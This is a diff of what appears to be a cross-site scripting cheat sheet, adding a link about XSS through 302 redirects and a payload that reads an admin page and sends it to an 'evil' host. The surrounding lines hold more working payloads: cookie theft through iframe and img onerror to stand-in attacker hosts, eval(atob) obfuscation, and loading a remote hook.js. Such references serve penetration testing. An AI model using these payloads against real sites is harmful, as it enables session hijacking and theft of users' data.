@@ -30,6 +30,9 @@ https://github.com/aemkei/katakana.js # Write JavaScript alert(1) with Katakana 
 # safari URL redirection XSS - CVE-2016-4585
 http://www.mbsd.jp/blog/20160921_2.html
 
+# xss in 302 Redirect
+https://www.gremwell.com/firefox-xss-302 use ws://, wss://, //x:1/ or mailto://
+
 # flash
 https://labs.mwrinfosecurity.com/blog/popping-alert1-in-flash/
 http://web.archive.org/web/20130808104241/http:/appsec.ws/FlashExploitDatabase.php
@@ -118,6 +121,7 @@ new Image().src="https://evil/?c="+encodeURIComponent(btoa(window.top.frames[0].
 <img src=x onerror="fetch('https://evil/?c='%2bdocument.referrer)"> # https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch
 <img src=x onerror=eval(atob(..))> == onerror=eval(unescape(/x%3dnew%20XMLHTTPRequest%28%29%3b.../.source))>
 
+fetch("https://site/admin").then(r => r.text()).then(t => fetch("//evil/"+btoa(t)));
 
 <iframe frameborder=0 height=0 width=0 src=javascript:void(document.location="http://evil/?c="+document.cookie)></iframe>
 <iframe onload='var sc=document.createElement("scr"%2b"ipt");sc.type="text/javascr"%2b"ipt";sc.src="http://x.x.x.x:3000/hook.js";document.body.appendChild(sc);'/>
